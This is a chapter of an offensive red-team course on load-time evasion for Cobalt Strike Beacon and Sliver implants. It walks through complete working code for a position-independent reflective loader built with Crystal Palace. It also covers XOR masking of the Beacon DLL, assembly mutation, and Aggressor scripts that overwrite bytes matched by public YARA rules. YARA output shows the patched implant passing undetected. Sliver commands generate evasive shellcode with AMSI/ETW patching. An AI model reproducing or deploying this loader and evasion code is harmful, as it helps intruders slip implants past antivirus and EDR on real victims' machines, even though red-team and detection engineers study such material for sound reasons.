3. Load-Time Evasion

What is load-time evasion? Before Beacon can do anything, it needs to get into the target's memory. This is the most dangerous moment — the payload exists on disk (or in transit over the network) where antivirus and EDR can scan it byte-by-byte. Load-time evasion is about making the payload unrecognisable to static scanners during this initial loading phase. Once it's in memory and running, we switch to runtime evasion (Chapter 4).

Beacon is a Windows DLL that must be loaded into memory to run. Traditionally it has been implemented as a reflective DLL based on Stephen Fewer's ReflectiveDLLInjection — a DLL that exports a function which, when executed, walks back over its own image, loads a fresh copy of itself into memory, resolves imports, applies relocations, and calls its entry point.

Malleable C2 provides options for changing Beacon's reflective loading behaviour — stage.allocator, stage.magic_pe, stage.module_[x86/x64], stage.obfuscate, etc. UDRL (User-Defined Reflective Loader, added in CS 4.4) gives full operator control over the loader. Two loader styles have shipped:

Sliver equivalent: Sliver implants are Go binaries, not reflective DLLs. The loader is built into the implant and isn't user-customizable the way UDRL is. The realistic adaptation is to generate raw shellcode with generate --format shellcode and wrap it in whatever external loader you want (Stardust, Crystal Palace, sRDI, donut, etc.). Sliver also ships obfuscate (garble-based) for binary obfuscation, and the --evasion build flag enables built-in mitigations like AMSI/ETW patching and the call stack manipulator in the implant.

# Generate raw shellcode (HTTPS C2) to feed into an external loader
sliver > generate --http https://c2.example.com --format shellcode --evasion --save /tmp/

# Or generate a stage-1 implant for staged delivery
sliver > profiles new --http https://c2.example.com --format shellcode --evasion stage1
sliver > stage-listener --url http://0.0.0.0:8080 --profile stage1
Stomped (legacy)Prepended (default since CS 4.11)
LayoutCustom .text stomped into BeaconLoader prepended in front of the DLL
OriginUDRL since CS 4.4sRDI / DoublePulsar pattern since CS 4.9
Requires exported functionYesNo
DOS-header shellcode stubYesNo
Obfuscation optionsLimitedExtensive

The stomped loader is being phased out. This chapter focuses on prepended loaders only.

Prepended loaders are implemented as position-independent code (PIC) — they must execute correctly from any memory location. Historically this required hand-written assembly; modern practice is to write in C and extract the .text section. That brings its own constraints:

  • No access to .data, .rdata, or .bss — no string constants, no globals
  • No access to Windows APIs or C runtime functions

PIC frameworks abstract these limitations. Three popular ones:

3.1 UDRL-VS

udrl-vs is the Cobalt Strike team's Visual Studio solution, distributed with the Arsenal Kit for licensed users. It contains multiple reflective loader examples that can be used as-is or customised. Each project is a console application so it runs and debugs under the Visual Studio debugger; the final output is the extracted .text section. The templates provide helper macros like PIC_STRING for PIC-compatible string handling.

3.2 Stardust

Stardust is a C++ template for writing entire implants as PIC (not just loaders, and not necessarily DLLs). This course doesn't use Stardust, but it's the framework of choice for the BOF Development & Tradecraft course by Alex Reid.

3.3 Crystal Palace

Crystal Palace is maintained by Raphael Mudge (the original creator of Cobalt Strike). It eases PIC capability and loader development with built-in support for resource appending, string handling, Windows API access, link-time optimisation, and code mutation. This course relies on Crystal Kit — a Crystal-Palace-based evasion kit for Cobalt Strike — for all subsequent loaders.

3.4 Simple Loader

This section walks through writing a simple loader with Crystal Palace (based on the Simple Loader example from the Tradecraft Garden) and hooking it into Cobalt Strike. Watch the Tradecraft Garden Overview for background.

3.4.1 Entry point

The loader's entry point is named go. A basic loader takes no parameters and returns nothing (the postex loader §5 covers a variant that does):

#include <windows.h>

DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc ( LPVOID, SIZE_T, DWORD, DWORD );

void go ( ) {
    ...
}

3.4.2 Function resolving

Crystal Palace supports dynamic function resolution via the MODULE$Function reference pattern. The pattern must be paired with a resolve function that returns a pointer to the requested API. Crystal Palace's standard library makes this trivial:

#include "tcg.h"

FARPROC resolve ( DWORD mod_hash, DWORD func_hash )
{
    HANDLE module = findModuleByHash ( mod_hash );
    return findFunctionByHash ( module, func_hash );
}
  • findModuleByHash walks the PEB's InMemoryOrderModuleList looking for a matching module
  • findFunctionByHash walks the module's Export Address Table looking for a matching function

Most PIC frameworks require the developer to pre-compute ROR13 hashes for every module and API. Crystal Palace does this at link time — add dfr "resolve" "ror13" to the spec file and it generates the hashes and inserts call resolve instructions in place of direct API references. In the source COFF, the references look like normal external symbols:

0000000000000081 488B0500000000   mov    __imp_KERNEL32$VirtualAlloc,%rax
0000000000000088 FFD0             call   *%rax

In the final PIC, they're rewritten to resolve calls with embedded hashes:

0000000000000051 B95BBC4A6A   mov    $0x6A4A`BC5B,%ecx
0000000000000056 BA54CAAF91   mov    $0x91AF`CA54,%edx
000000000000005B E8CE000000   call   resolve

dfr also supports "strings" instead of "ror13" — module and function names are passed as strings (useful for postex loaders using smartinject). A string-based resolve function looks like:

DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleA ( LPCSTR );

FARPROC resolve_ext ( char * mod_name, char * func_name )
{
    HANDLE module = KERNEL32$GetModuleHandleA ( mod_name );

    if ( module == NULL ) {
        module = LoadLibraryA ( mod_name );
    }

    return GetProcAddress ( module, func_name );
}

3.4.3 Linked resources

Crystal Palace uses gcc's section attribute to append resources to a loader. Declare a zero-length placeholder in a custom section — Crystal Palace fills it during linking:

char _DLL_ [0] __attribute__ ( ( section ( "dll" ) ) );

Reference the resource by its symbol address. Wrap in a dedicated accessor:

char * find_appended_dll ( ) {
	return ( char * ) &_DLL_;
}

Or use a generic macro:

#define GETRESOURCE(x) ( char * ) &x
...
char * dll = GETRESOURCE ( _DLL_ );

3.4.4 IMPORTFUNCS

PicoLoad and ProcessImports from tcg.h need LoadLibraryA and GetProcAddress to resolve nested DLL dependencies. They take an IMPORTFUNCS struct that holds those two pointers:

typedef struct {
    __typeof__(LoadLibraryA)   * LoadLibraryA;
    __typeof__(GetProcAddress) * GetProcAddress;
} IMPORTFUNCS;

Typical setup:

/* setup our IMPORTFUNCS data structure */
IMPORTFUNCS funcs;
funcs.LoadLibraryA   = LoadLibraryA;
funcs.GetProcAddress = GetProcAddress;

...

/* process the DLL's imports */
ProcessImports ( &funcs, &data, dst );

Note the absence of DFR references for LoadLibraryA and GetProcAddress — Crystal Palace implicitly treats them as KERNEL32$LoadLibraryA and KERNEL32$GetProcAddress.

3.4.5 Putting it together

The complete simple loader:

#include <windows.h>
#include "tcg.h"

DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc ( LPVOID, SIZE_T, DWORD, DWORD );

char _DLL_ [0] __attribute__ ( ( section ( "dll" ) ) );

#define GETRESOURCE(x) ( char * ) &x

void go ( )
{
	/* populate funcs */
	IMPORTFUNCS funcs;
	funcs.LoadLibraryA   = LoadLibraryA;
	funcs.GetProcAddress = GetProcAddress;

	/* get the DLL appended to the loader */
	char * dll_src = GETRESOURCE ( _DLL_ );

	/* parse its headers */
	DLLDATA dll_data;
	ParseDLL ( dll_src, &dll_data );

	/* allocate some RWX memory */
	char * dll_dst = KERNEL32$VirtualAlloc ( NULL, SizeOfDLL ( &dll_data ), MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE );

	/* copy it into memory */
	LoadDLL ( &dll_data, dll_src, dll_dst );

	/* process its imports */
	ProcessImports ( &funcs, &dll_data, dll_dst );

	/* get its entry point */
	DLLMAIN_FUNC entry_point = EntryPoint ( &dll_data, dll_dst );

	/* call it twice for Beacon */
	entry_point ( ( HINSTANCE ) dll_dst, DLL_PROCESS_ATTACH, NULL );
	entry_point ( ( HINSTANCE ) ( char * ) go, 0x4, NULL );
}

FARPROC resolve ( DWORD mod_hash, DWORD func_hash )
{
    HANDLE module = findModuleByHash ( mod_hash );
    return findFunctionByHash ( module, func_hash );
}

Beacon (and its postex DLLs) use a calling convention where the entry point must be called twice:

  1. First call with fdwReason = 1 (DLL_PROCESS_ATTACH), passing the DLL's own base address — bootstrap
  2. Second call with fdwReason = 4, passing the loader's base address — required so that stage.cleanup / post-ex.cleanup can free the loader from memory

3.4.6 Makefile & specification file

Crystal Palace compiles with mingw-w64. A typical Makefile:

CC_64=x86_64-w64-mingw32-gcc

all: bin/loader.x64.o

bin:
	mkdir bin

bin/loader.x64.o: bin
	$(CC_64) -DWIN_X64 -shared -Wall -Wno-pointer-arith -c src/loader.c -o bin/loader.x64.o

clean:
	rm -f bin/*

Build with make clean && make all. Crystal Palace then uses spec files to combine the COFFs with resources. A simple spec:

x64:
	load "bin/loader.x64.o"        # read the loader COFF
		make pic +gofirst          # turn it into PIC and ensure the go function is at the start
		dfr "resolve" "ror13"      # use ror13 with the resolve method for resolving dfr functions
		mergelib "libtcg.x64.zip"  # merge the shared library

	push $DLL       # read the dll being provided
		link "dll"  # link it to the "dll" section in the loader

	export  # export the final pic

Crystal Palace assumes COFFs are pre-built when running a spec, so always rebuild after changes to the loader source.

3.4.7 Aggressor

Integrate the Crystal Palace loader into Cobalt Strike via the BEACON_RDLL_GENERATE hook. CS calls the hook when generating a stageless payload and passes three arguments:

ArgumentContent
$1Beacon payload file name
$2Raw Beacon DLL
$3Payload architecture (x86 / x64)

A pre-built loader can be read from disk and concatenated with Beacon:

set BEACON_RDLL_GENERATE
{
    local ( '$beacon $arch $loader_path $file_handle $ldr' );

    $beacon = $2;
    $arch   = $3;

    $loader_path = getFileProper ( script_resource ( ), "loader." . $arch . ".bin" );
    $file_handle = openf ( $loader_path );
    $ldr         = readb ( $file_handle, -1 );

    closef ( $file_handle );

    return $ldr . $beacon;
}

For a Crystal-Palace-driven build, copy crystalpalace.jar into the Cobalt Strike client directory (next to cobaltstrike-client.jar) and import the Java classes:

import crystalpalace.spec.* from: crystalpalace.jar;
import java.util.HashMap;

Then call the Crystal Palace Java API from inside the hook, passing the spec file path and the raw Beacon DLL:

set BEACON_RDLL_GENERATE
{
    local ( '$beacon $arch $spec_path $spec $final' );

    $beacon = $2;
    $arch   = $3;

    if ( $arch eq "x86" ) {
        warn ( "Crystal Kit is x64 only" );
        return $null;
    }

    # get path to spec file
    $spec_path = getFileProper ( script_resource ( "udrl" ), "loader.spec" );

    # parse the spec
    $spec = [ LinkSpec Parse: $spec_path ];

    # apply the spec
    $final = [ $spec run: $beacon, [ new HashMap ] ];

    if ( strlen ( $final ) == 0 )
    {
        warn ( "Failed to build payload" );
        return $null;
    }

    # return the output from crystal palace
    return $final;
}

The return value is the PIC blob containing the loader and Beacon DLL. Returning $null tells Cobalt Strike to fall back to its default loader.

Sliver equivalent: Sliver has no UI hook like BEACON_RDLL_GENERATE. Custom loaders are integrated outside the framework — generate Sliver shellcode, then pipe it through your loader as a separate build step. The simplest pattern is a shell wrapper that calls the Sliver client (CLI mode), retrieves the shellcode, and runs your loader build:

#!/usr/bin/env bash
# build-loader.sh — wraps Sliver shellcode in a Crystal Palace loader
sliver-client --config ~/.sliver-client/configs/op.cfg \
  -e "generate --http https://c2.example.com --format shellcode --save /tmp/sliver.bin"

# now invoke the linker spec like the BEACON_RDLL_GENERATE hook would
java -jar crystalpalace.jar build loader.spec /tmp/sliver.bin /tmp/loader.bin

If you script Sliver as an operator, you can wrap this in an alias (JSON-defined client extension). Sliver aliases live under ~/.sliver-client/aliases/ and are loaded with aliases load — the closest analogue to an Aggressor script for operator-side automation.

3.5 Loader Modularity

Crystal Palace supports modular loaders rather than monoliths in one .c file. Two commands enable this: merge (combine COFFs) and mergelib (combine ZIP-packaged COFF libraries).

3.5.1 merge

A good candidate for splitting out is the resolve services. Create services.c with both resolve functions:

#include <windows.h>
#include "tcg.h"

DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleA ( LPCSTR );

/**
 * This function is used to locate functions in
 * modules that are loaded by default (K32 & NTDLL)
 */
FARPROC resolve ( DWORD mod_hash, DWORD func_hash )
{
    HANDLE module = findModuleByHash ( mod_hash );
    return findFunctionByHash ( module, func_hash );
}

/**
 * This function is used to load and/or locate functions
 * in modules that are not loaded by default.
 */
FARPROC resolve_ext ( char * mod_name, char * func_name )
{
    HANDLE module = KERNEL32$GetModuleHandleA ( mod_name );

    if ( module == NULL ) {
        module = LoadLibraryA ( mod_name );
    }

    return GetProcAddress ( module, func_name );
}

Update the Makefile to build both COFFs:

bin/loader.x64.o: bin
	$(CC_64) -DWIN_X64 -shared -Wall -Wno-pointer-arith -c src/loader.c   -o bin/loader.x64.o
	$(CC_64) -DWIN_X64 -shared -Wall -Wno-pointer-arith -c src/services.c -o bin/services.x64.o

In the spec file, load the loader COFF and turn it into PIC, then load and merge the services COFF:

x64:
    load "bin/loader.x64.o"    # read the loader COFF
        make pic +gofirst      # turn it into PIC

    load "bin/services.x64.o"  # load the services COFF
        merge                  # merge it into the loader PIC

    dfr "resolve" "ror13" "KERNEL32, NTDLL"  # default resolve func
    dfr "resolve_ext" "strings"              # extra resolve func

    mergelib "../libtcg.x64.zip"             # merge the libtcg

    push $DLL
        link "dll"

    export

3.5.2 mergelib

mergelib works like merge but operates on an entire ZIP that can contain multiple COFFs — useful for sharing common functionality across projects. The TCG shared library packages DLL-loading primitives. The library's Makefile is mostly identical to a regular one but includes a zip step:

libtcg.x64.zip: bin
	$(CC_64) -DWIN_X64 -shared -masm=intel -Wall -Wno-pointer-arith -c src/loaddll.c     -o bin/loaddll.x64.o
	$(CC_64) -DWIN_X64 -shared -masm=intel -Wall -Wno-pointer-arith -c src/resolve_eat.c -o bin/resolve_eat.x64.o
	$(CC_64) -DWIN_X64 -shared -masm=intel -Wall -Wno-pointer-arith -c src/picorun.c     -o bin/picorun.x64.o
	$(CC_64) -DWIN_X64 -shared -masm=intel -Wall -Wno-pointer-arith -c src/debug.c       -o bin/debug.x64.o
	$(CC_64) -DWIN_X64 -shared -masm=intel -Wall -Wno-pointer-arith -c src/util.c        -o bin/util.x64.o
	zip -q -j libtcg.x64.zip bin/*.x64.o

Reference the library in a spec file with a relative path:

mergelib "../libtcg.x64.zip"

3.5.3 Spec files

Spec files can call other spec files via the run command, keeping projects modular. Extract resolve setup into services.spec:

x64:
    load "bin/services.x64.o"
        merge

    mergelib "../libtcg.x64.zip"

    dfr "resolve" "ror13" "KERNEL32, NTDLL"
    dfr "resolve_ext" "strings"

And run it from the loader spec:

x64:
    load "bin/loader.x64.o"
        make pic +gofirst

    run "services.spec"  # run the services spec

    push $DLL
        link "dll"

    export

3.6 Removing RWX memory

The simple loader allocates a single RWX region for Beacon — bad OPSEC. Most security products alert on RWX allocations outside of expected dynamic-runtime processes like PowerShell. The fix: allocate RW, then set per-section permissions based on each DLL section's Characteristics flags.

Add a DFR reference for VirtualProtect:

DECLSPEC_IMPORT BOOL WINAPI KERNEL32$VirtualProtect ( LPVOID, SIZE_T, DWORD, PDWORD );

Write a function that walks the section headers and applies the correct PAGE_* protection per section:

void fix_section_permissions ( DLLDATA * dll, char * src, char * dst )
{
    DWORD                  section_count = dll->NtHeaders->FileHeader.NumberOfSections;
    IMAGE_SECTION_HEADER * section_hdr   = NULL;
    void                 * section_dst   = NULL;
    DWORD                  section_size  = 0;
    DWORD                  new_protect   = 0;
    DWORD                  old_protect   = 0;

    section_hdr  = ( IMAGE_SECTION_HEADER * ) PTR_OFFSET ( dll->OptionalHeader, dll->NtHeaders->FileHeader.SizeOfOptionalHeader );

    for ( int i = 0; i < section_count; i++ )
    {
        section_dst  = dst + section_hdr->VirtualAddress;
        section_size = section_hdr->SizeOfRawData;

        if ( section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE ) {
            new_protect = PAGE_WRITECOPY;
        }
        if ( section_hdr->Characteristics & IMAGE_SCN_MEM_READ ) {
            new_protect = PAGE_READONLY;
        }
        if ( ( section_hdr->Characteristics & IMAGE_SCN_MEM_READ ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE ) ) {
            new_protect = PAGE_READWRITE;
        }
        if ( section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE ) {
            new_protect = PAGE_EXECUTE;
        }
        if ( ( section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE ) ) {
            new_protect = PAGE_EXECUTE_WRITECOPY;
        }
        if ( ( section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_READ ) ) {
            new_protect = PAGE_EXECUTE_READ;
        }
        if ( ( section_hdr->Characteristics & IMAGE_SCN_MEM_READ ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE ) ) {
            new_protect = PAGE_EXECUTE_READWRITE;
        }

        /* set new permission */
        KERNEL32$VirtualProtect ( section_dst, section_size, new_protect, &old_protect );

        /* advance to section */
        section_hdr++;
    }
}

Change VirtualAlloc to allocate RW instead of RWX — replace PAGE_EXECUTE_READWRITE with PAGE_READWRITE:

char * dll_dst = KERNEL32$VirtualAlloc ( NULL, SizeOfDLL ( &dll_data ), MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE );

Call fix_section_permissions after ProcessImports:

/* process the imports */
ProcessImports ( &funcs, &dll_data, dll_dst );

/* fix section permissions */
fix_section_permissions ( &dll_data, dll_src, dll_dst );

No spec file changes required.

3.7 Optimizations & Obfuscations

Crystal Palace provides link-time optimisation, function reordering, and code mutation as PIC build options. Enable them via spec-file flags on make pic:

FlagEffect
+gofirstPin go as the first function
+optimizeStrip unused functions from merged COFFs
+discoRandomise function order (except go)
+mutateMutate assembly inside each function

Use the disassemble command in the spec to inspect the resulting PIC:

x64:
	load "bin/loader.x64.o"
		make pic +gofirst

    run "services.spec"

	disassemble "out.txt"  # disassemble loader PIC and save as out.txt

	push $DLL
		link "dll"

	export

3.7.1 Code optimization

With only +gofirst, every function in the merged COFFs appears in the PIC — including unused ones like dprintf, PicoEntryPoint, and PicoLoad from the shared library. These inflate the PIC size and detection surface:

0000000000000000 <go>
0000000000000167 <resolve>
0000000000000198 <loaderStart>
00000000000001A5 <fix_section_permissions>
0000000000000370 <findModuleByHash>
0000000000000463 <findFunctionByHash>
0000000000000590 <GetDataDirectory>
00000000000005B3 <ProcessRelocation>
0000000000000757 <ProcessRelocations>
00000000000007F7 <ProcessImport>
0000000000000901 <ProcessImports>
0000000000000975 <LoadSections>
0000000000000A74 <ParseDLL>
0000000000000ABE <EntryPoint>
0000000000000AE0 <SizeOfDLL>
0000000000000AF5 <LoadDLL>
0000000000000B43 <dprintf>
0000000000000CDB <PicoEntryPoint>
0000000000000D0A <PicoCodeSize>
0000000000000D1A <PicoDataSize>
0000000000000D2B <PicoLoad>

Add +optimize (make pic +gofirst +optimize) and Crystal Palace strips the unused functions:

0000000000000000 <go>
0000000000000167 <resolve>
0000000000000198 <loaderStart>
00000000000001A5 <fix_section_permissions>
0000000000000370 <findModuleByHash>
0000000000000463 <findFunctionByHash>
0000000000000590 <GetDataDirectory>
00000000000005B3 <ProcessRelocation>
0000000000000757 <ProcessRelocations>
00000000000007F7 <ProcessImport>
0000000000000901 <ProcessImports>
0000000000000975 <LoadSections>
0000000000000A74 <ParseDLL>
0000000000000ABE <EntryPoint>
0000000000000AE0 <SizeOfDLL>
0000000000000AF5 <LoadDLL>

3.7.2 Function reordering

The compiler emits functions in a deterministic order. Add +disco to randomise the order in the final PIC. go stays first because of +gofirst; everything else moves:

0000000000000000 <go>
0000000000000167 <ProcessImports>
00000000000001DB <loaderStart>
00000000000001E8 <LoadDLL>
0000000000000236 <GetDataDirectory>
0000000000000259 <ProcessRelocation>
00000000000003FD <LoadSections>
00000000000004FC <findFunctionByHash>
0000000000000629 <ProcessImport>
0000000000000733 <fix_section_permissions>
00000000000008FE <findModuleByHash>
00000000000009F1 <ParseDLL>
0000000000000A3B <SizeOfDLL>
0000000000000A50 <ProcessRelocations>
0000000000000AF0 <resolve>
0000000000000B21 <EntryPoint>

3.7.3 Code mutation

+mutate rewrites the assembly inside each function while preserving behaviour. The source for SizeOfDLL is trivial:

DWORD SizeOfDLL(DLLDATA * data) {
    return data->OptionalHeader->SizeOfImage;
}

Without mutation, the disassembly is direct:

0000000000000A3B <SizeOfDLL>:
0000000000000A3B 55                   push      %rbp
0000000000000A3C 4889E5               mov       %rsp,%rbp
0000000000000A3F 48894D10             mov       %rcx,0x10(%rbp)
0000000000000A43 488B4510             mov       0x10(%rbp),%rax
0000000000000A47 488B4010             mov       0x10(%rax),%rax
0000000000000A4B 8B4038               mov       0x38(%rax),%eax
0000000000000A4E 5D                   pop       %rbp
0000000000000A4F C3                   ret

With +mutate, the same function does more work to reach the same result — extra register juggling and offset arithmetic:

000000000000022B <SizeOfDLL>:
000000000000022B 55                   push      %rbp
000000000000022C 4889E5               mov       %rsp,%rbp
000000000000022F 4157                 push      %r15
0000000000000231 4C8D7D00             lea       (%rbp),%r15
0000000000000235 49894F10             mov       %rcx,0x10(%r15)
0000000000000239 415F                 pop       %r15
000000000000023B 488D45C0             lea       -0x40(%rbp),%rax
000000000000023F 488B4050             mov       0x50(%rax),%rax
0000000000000243 488D40D8             lea       -0x28(%rax),%rax
0000000000000247 488B4038             mov       0x38(%rax),%rax
000000000000024B 8B4038               mov       0x38(%rax),%eax
000000000000024E 5D                   pop       %rbp
000000000000024F C3                   ret

The output varies each build, defeating static signatures. Two trade-offs: PIC grows 20–90%, and mutation can break code that depends on specific instruction sequences.

3.8 Resource Masking

The optimisations in §3.7 affect the loader only, not the appended DLL. An on-disk dump of the final PIC reveals the obviously-DLL tail — MZ header, "This program cannot be run in DOS mode", and so on:

00001320: 0003 0000 0004 0000 00ff ff00 00b8 0000  ................

00001340: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00001350: 0000 0000 0000 0000 0008 0100 000e 1fba  ................
00001360: 0e00 b409 cd21 b801 4ccd 2154 6869 7320  .....!..L.!This
00001370: 7072 6f67 7261 6d20 6361 6e6e 6f74 2062  program cannot b

00001390: 652e 0d0d 0a24 0000 0000 0000 0074 a5a3  e....$.......t..
000013a0: 1130 c4cd 4230 c4cd 4230 c4cd 4256 2a03  .0..B0..B0..BV*.

000013c0: 4231 c4cd 42c1 0202 4219 c4cd 42c1 0203  B1..B...B...B...
000013d0: 42b5 c4cd 42c1 0200 423a c4cd 4239 bc5e  B...B...B:..B9.^
000013e0: 423b c4cd 4230 c4cc 42ef c4cd 4213 2b03  B;..B0..B...B.+.
000013f0: 4272 c4cd 4256 2a00 4232 c4cd 4256 2a01  Br..BV*.B2..BV*.
00001400: 4231 c4cd 4252 6963 6830 c4cd 4200 0000  B1..BRich0..B...

Crystal Palace can mask the DLL with XOR or RC4 before appending. The example below uses XOR.

3.8.1 Loader

Add a section to hold the XOR key alongside the existing DLL section:

char _DLL_   [0] __attribute__ ( ( section ( "dll"   ) ) );
char _MASK_  [0] __attribute__ ( ( section ( "mask"  ) ) );

Both resources will be length-prefixed. Add a helper struct to read them:

typedef struct {
    int  len;
    char value[];
} RESOURCE;

Cast each resource pointer:

RESOURCE * masked_dll = ( RESOURCE * ) GETRESOURCE ( _DLL_ );
RESOURCE * mask_key   = ( RESOURCE * ) GETRESOURCE ( _MASK_ );

Add a DFR reference for VirtualFree — needed to release the temporary unmasked buffer:

DECLSPEC_IMPORT BOOL WINAPI KERNEL32$VirtualFree ( LPVOID, SIZE_T, DWORD );

Update go to allocate a temporary buffer, unmask the DLL, parse it, then free the buffer right before calling the entry point:

/* allocate some temporary memory */
char * dll_src = KERNEL32$VirtualAlloc ( NULL, masked_dll->len, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE );

/* unmask and copy it into memory */
for ( int i = 0; i < masked_dll->len; i++ ) {
    dll_src [ i ] = masked_dll->value [ i ] ^ mask_key->value [ i % mask_key->len ];
}

/* now parse the unmasked copy */
DLLDATA dll_data;
ParseDLL ( dll_src, &dll_data );

/* allocate new memory beacon */
char * dll_dst = KERNEL32$VirtualAlloc ( NULL, SizeOfDLL ( &dll_data ), MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE );

... etc ...

/* get the DLLs entry point */
DLLMAIN_FUNC entry_point = EntryPoint ( &dll_data, dll_dst );

/* free the unmasked copy */
KERNEL32$VirtualFree ( dll_src, 0, MEM_RELEASE );

/* call entry point */
entry_point ( ( HINSTANCE ) dll_dst, DLL_PROCESS_ATTACH, NULL );
entry_point ( ( HINSTANCE ) ( char * ) go, 0x4, NULL );

3.8.2 Specification file

generate creates random bytes per build, ensuring a unique key per payload. xor applies the key; preplen length-prefixes the result; link binds it to the named section:

generate $KEY 128  # generate a random 128-byte key and assign it to the $KEY variable

push $DLL
	xor $KEY    # xor the dll with the key
	preplen     # prepend its length
	link "dll"  # link it to the "dll" section

push $KEY
	preplen      # prepend the key's length
	link "mask"  # link it to the "mask" section

The tail of the final PIC is now opaque — no recognisable PE structure:

00001310: 951a 0503 47cf ee60 0a4b 9380 5eb0 ab46  ....G..`.K..^..F
00001320: 2885 5fc1 2b71 a2ae 67e9 b68c 5056 ea9b  (._.+q..g...PV..
00001330: e700 d8b0 8379 841e bd57 273a 8889 9090  .....y...W':....
00001340: ed9f b5c6 2aff 9133 8b77 f143 2edd 0680  ....*..3.w.C....
00001350: e6d3 74bd a483 c07c 4f67 e2a9 9fae 91ac  ..t....|Og......
00001360: 04fe cb10 7ef2 bbc9 be5c 6bfa fa15 b6e0  ....~....\k.....

3.9 Static Signatures

Masking the appended Beacon DLL (§3.8) defeats on-disk signatures, but many signatures target Beacon once it's unmasked and loaded into memory — typically hardcoded strings in .rdata, sometimes parts of .text.

The runtime evasion chapter introduces memory obfuscation that masks Beacon's PE sections during sleep. There's still a small window between injection and the first sleep where Beacon is detectable. Modifying signatured bytes during the load process closes that window.

Malleable C2's stage.transform.strrep directive normally handles this but is bypassed when using a custom loader. The equivalent must be implemented in Aggressor. strrep_pad wraps the built-in strrep to handle replacements where the new string is shorter than the original (padding the difference with null bytes):

# ------------------------------------------------------------------
# A wrapper around strrep to pad the new string before replacing it.
# $1 = input dll
# $2 = original string
# $3 = new string
# return = the modified byte sequence
# ------------------------------------------------------------------
sub strrep_pad
{
    local ( '$input_dll $original_byte_sequence $new_byte_sequence $original_byte_sequence_length $new_byte_sequence_length $difference $padding $new_byte_sequence_padded' );
    
    $input_dll              = $1;
    $original_byte_sequence = $2;
    $new_byte_sequence      = $3;

    $original_byte_sequence_length = strlen ( $original_byte_sequence );
    $new_byte_sequence_length      = strlen ( $new_byte_sequence );

    if ( $new_byte_sequence_length > $original_byte_sequence_length )
    {
        warn ("Input string is too large");
        return $null;
    } 

    $difference = $original_byte_sequence_length - $new_byte_sequence_length;

    if ( $difference != 0 )
    {
        $padding = "\x00" x $difference;
        $new_byte_sequence_padded = $new_byte_sequence . $padding;
    }
    else
    {
        $new_byte_sequence_padded = $new_byte_sequence;
    }
    
    return strrep ( $input_dll, $original_byte_sequence, $new_byte_sequence_padded );
}

Apply the substitutions inside BEACON_RDLL_GENERATE before passing Beacon to Crystal Palace. The new string must be the same length or shorter than the original — never longer:

set BEACON_RDLL_GENERATE
{
    local ( '$beacon $arch $file_path $spec $final' );

    $beacon = $2;
    $arch   = $3;

    if ( $arch eq "x86" )
    {
        warn ( "Crystal Kit is x64 only" );
        return $null;
    }

    # replace some common strings
    $beacon = strrep_pad ( $beacon, "beacon.x64.dll", "bacon.x64.dll" );
    $beacon = strrep_pad ( $beacon, "%02d/%02d/%02d", "%02d/%02d/%04d" );
    $beacon = strrep_pad ( $beacon, "%s as %s\%s: %d", "%s - %s\%s (%d)" );
    $beacon = strrep_pad ( $beacon, "\x48\x89\x5C\x24\x08\x57\x48\x83\xEC\x20\x48\x8B\x59\x10\x48\x8B\xF9\x48\x8B\x49\x08\xFF\x17\x33\xD2\x41\xB8\x00\x80\x00\x00", "\x48\x89\x5C\x24\x08\x57\x48\x83\xEC\x20\x48\x8B\x59\x10\x48\x8B\xF9\x48\x8B\x49\x08\xFF\x17\x33\xD2\x41\xB8\x01\x80\x00\x00" );

    # get path to spec file
    $file_path = getFileProper( script_resource ( "udrl" ), "loader.spec" );

    ...

    return $final;
}

YARA confirms the replacements work — the modified Beacon (PID 4136) hits zero signatures, while the unmodified one (PID 9420) hits multiple:

C:\Tools\yara>yara64.exe -s Windows_Trojan_CobaltStrike.yar 9420
Windows_Trojan_CobaltStrike_663fc95d 9420
0x24de23e1e64:$a: 48 89 5C 24 08 57 48 83 EC 20 48 8B 59 10 48 8B F9 48 8B 49 08 FF 17 33 D2 41 B8 00 80 00 00
Windows_Trojan_CobaltStrike_3dc22d14 9420
0x24de23f680c:$a1: %02d/%02d/%02d %02d:%02d:%02d
0x24de23f6838:$a1: %02d/%02d/%02d %02d:%02d:%02d
0x24de23f67e0:$a2: %s as %s\%s: %d

C:\Tools\yara>yara64.exe -s Windows_Trojan_CobaltStrike.yar 4136

C:\Tools\yara>

Sliver equivalent: Sliver's signature surface is different — Go binaries with runtime metadata, build IDs, type info, etc. Two layers of mitigation:

  • Build-time: generate defaults to obfuscating the implant via garble. Disable garbage symbol stripping with --skip-symbols=false only for debugging. The --evasion flag also patches AMSI/ETW and enables call-stack tradecraft baked into the implant.
  • Post-build: Run a YARA-driven signature strip on the compiled binary. Community tools like SliverSigStripper remove the strings public rules target (e.g. elastic/protections-artifacts Sliver signatures).
sliver > generate --http https://c2.example.com --evasion --os windows --arch amd64 --format exe --save /tmp/
# Confirm no signatures
$ yara -r ~/rules/sliver/ /tmp/implant.exe

3.10 Applying Evasive Tradecraft

Crystal Palace weaves tradecraft into the loader at link time, not build time. The loader can be written with vanilla API calls (VirtualAlloc, VirtualProtect, etc.); evasive tradecraft is bolted on per build via spec-file commands. This decouples the loader from the tradecraft — you can swap techniques without rewriting the loader.

3.10.1 Call stacks

A loader running from unbacked memory produces garbage call stacks for every API it calls — easy detection for any product analysing call stacks via ETW-TI:

# Child-SP          RetAddr               Call Site
00 00000071`73fff7f8 00000184`8ed00070     KERNELBASE!VirtualAlloc
01 00000071`73fff800 00000071`73fff830     0x00000184`8ed00070
